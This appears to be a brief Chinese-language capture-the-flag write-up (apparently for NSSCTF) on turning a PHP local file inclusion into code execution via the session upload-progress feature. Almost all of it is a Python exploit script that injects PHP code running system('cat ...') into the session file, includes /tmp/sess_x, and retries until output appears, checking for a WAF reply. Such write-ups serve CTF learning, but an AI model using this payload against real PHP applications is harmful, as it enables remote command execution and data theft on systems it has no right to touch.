# 思路
	- session上传文件然后include
- # 脚本
	- 多次执行test函数直到其产生回显即可
	- ```python
	  def test(x):
	      r = base_post(
	          url,
	          params={"file": "/tmp/sess_x"},
	          data={"PHP_SESSION_UPLOAD_PROGRESS": "<?php echo 123123; system('cat /nssctfasdasdflag')?>"},
	          files={"file": ("a.txt", io.BytesIO(b"a" * 1024 * 50))},
	          cookies={"PHPSESSID": "x"},
	      )
	      if len(r.text) < 100 and "hacker" in r.text:
	          return "waf"
	      if "123123" in r.text:
	          return r.text
	      return None
	  
	  ```